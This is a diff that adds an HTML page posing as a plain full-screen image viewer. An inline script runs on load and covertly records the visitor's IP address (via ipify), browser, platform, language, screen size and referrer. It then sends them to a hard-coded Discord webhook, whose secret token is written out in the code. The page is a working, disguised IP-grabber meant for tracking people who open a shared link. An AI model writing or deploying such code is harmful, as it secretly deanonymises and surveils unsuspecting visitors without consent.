@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+        }
+        .container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://picsum.photos/seed/tracker/1200/800.jpg" alt="Image" id="mainImage">
+    </div>
+    
+    <script>
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const platform = navigator.platform;
+        const screenResolution = `${screen.width}x${screen.height}`;
+        const referer = document.referrer || "Accès direct";
+        const timestamp = new Date().toISOString();
+        
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                
+                sendToDiscord(ip, userAgent, language, platform, screenResolution, referer, timestamp);
+            })
+            .catch(error => {
+                console.error('Error on ip:', error);
+                // Envoyer les infos même sans IP
+                sendToDiscord("unknown", userAgent, language, platform, screenResolution, referer, timestamp);
+            });
+        
+        function sendToDiscord(ip, userAgent, language, platform, screenResolution, referer, timestamp) {
+            const webhookUrl = "https://discord.com/api/webhooks/1506765844166873200/hw2mE5yGAGATPIlxXgAwMkmlDV7hT9BKuFScjkBH4sbCNRGsAvIsN51mW8iYonjQQKbc";
+            
+            const embed = {
+                title: "New Click",
+                color: 5814783,
+                fields: [
+                    { name: "IP Adress", value: ip, inline: true },
+                    { name: "Platform", value: platform, inline: true },
+                    { name: "Screen Res", value: screenResolution, inline: true },
+                    { name: "Language", value: language, inline: true },
+                    { name: "Page", value: referer, inline: false },
+                    { name: "User Agent", value: userAgent, inline: false }
+                ],
+                footer: {
+                    text: `Date: ${timestamp}`
+                }
+            };
+            
+            const payload = {
+                content: "New click on track image !",
+                embeds: [embed]
+            };
+            
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error when send webhook discord:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Error network:', error);
+            });
+        }
+    </script>
+</body>
+</html>
